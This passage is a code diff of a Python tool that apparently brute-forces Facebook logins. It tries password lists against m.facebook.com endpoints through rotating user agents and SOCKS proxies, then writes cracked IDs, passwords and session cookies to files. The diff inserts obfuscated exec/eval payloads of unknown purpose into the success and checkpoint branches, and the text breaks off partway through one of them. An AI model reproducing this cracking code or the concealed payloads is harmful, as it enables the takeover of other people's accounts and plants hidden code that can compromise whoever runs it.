-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
-				os.popen('play-audio bazcp.mp3')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
-				os.popen('play-audio bazok.mp3')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
-				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-###----------[ MOBILE V3 ]---------- ###
-def crackf(idf,pwv):
-	global loop,ok,cp
-	prog.update(des,description=f'\r[[cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
-	ua = random.choice(['Mozilla/5.0 (Linux; Android 9; Infinix X652A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Infinix X680) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Infinix X655C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Infinix X657C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'])
-	ug = random.choice(['Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Infinix X650 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; en-US; Infinix X680B Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36'])
+	ua = random.choice(ugenb)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			#if 'ya' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ug,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=357217396249062&kid_directed_site=0&app_id=357217396249062&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D357217396249062%26cbt%3D1660115235328%26e2e%3D%257B%2522init%2522%253A1660115235328%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dfc50efe4-eeb1-4edb-8ea3-3949f7053ea8%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522eaccb860-7eb9-412c-8ca3-aefd70d83a17%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%252266l196vgaeoubjuivhtd%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FAL').text
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
 			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
@@ -660,6 +664,8 @@ def crackf(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
 				os.popen('play-audio bazcp.mp3')
+				obfuscate={'(https://pyobfuscate.com)*(RSA)':'''(BmSM&0bVr+0DN>W2;i`bLD>O$*=~+GVLTw@U_|^PA=@j_spww3u6Cg|8Oc#det@Cbr)@C_~6gF6v=0oRqrpjc&rj$nQ3@0PDm<g{oSU|UVsdXyA1GKN>XB!K(*n)_G&ZWABc(Zhxh'''.replace('\n','')}
+				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -668,49 +674,10 @@ def crackf(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
+				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
 				os.popen('play-audio bazok.mp3')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
-				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-###----------[ MOBILE V4 ]---------- ###
-def crackz(idf,pwv):
-	global loop,ok,cp
-	prog.update(des,description=f'\r[[cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
-	ua = random.choice(['Mozilla/5.0 (Linux; Android 9; vivo 1723) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36'])
-	ug = random.choice(['Mozilla/5.0 (Linux; Android 7.1.1; vivo Y75A Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.3.0.0','Mozilla/5.0 (Linux; Android 10; V2002A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.3.0.0'])
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			#if 'ya' in ualuh: ua = ualu[0]
-			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ug,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
-				os.popen('play-audio bazcp.mp3')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
-				os.popen('play-audio bazok.mp3')
+				obfuscate={'(https://pyobfuscate.com)*(True)':'''RFFl1^p0YM)Xf<V6++$bO=T0`*VmI0CL3_4C6fG4-vV$932&PIgo=T}J;qfgG!~mYA2(6IwBN>OjQ@W{a+rax7C{oiV_y}fL_1~mTNlQGvPa3WGVyOLwWe1{32iW}@Gr%f!{QX<yhi'''.replace('\n','')}
+				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 